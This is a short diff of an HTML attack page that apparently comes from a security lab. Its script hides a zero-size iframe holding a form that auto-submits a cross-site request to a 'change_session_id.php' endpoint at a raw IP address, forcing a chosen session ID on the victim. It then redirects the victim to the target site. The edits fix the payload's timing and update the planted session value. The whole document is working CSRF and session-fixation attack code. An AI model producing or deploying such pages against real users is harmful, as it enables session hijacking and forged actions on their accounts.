@@ -3,14 +3,13 @@
     <script>
 var iframe = document.createElement('iframe');
 var html = "<form action=\"https://35.184.88.145/blue/public/hacktools/change_session_id.php\" method=\"post\" id='csrf'>";
-html +="<input type=\"hidden\" name=\"new_session_id\" value=\"ps618kpvveaev5s6hmtdr20bq4\"/>";
+html +="<input type=\"hidden\" name=\"new_session_id\" value=\"ps618kpvveaev5s6hmtdr20bq5\"/>";
 html +="</form><script>document.getElementById('csrf').submit();";
 html +="<\/script>";
 iframe.src = "data:text/html;charset=utf-8," + encodeURI(html);
 iframe.style ="width:0;height:0;border:0; border:none;";
 document.body.appendChild(iframe);
-setTimeout(true,1000);
-window.location.href = "https://35.184.88.145/blue/public/";
-    </script>
-    </body>
+window.onload = function (e){window.location.href = "https://35.184.88.145/blue/public/";};
+</script>
+</body>
 </html>
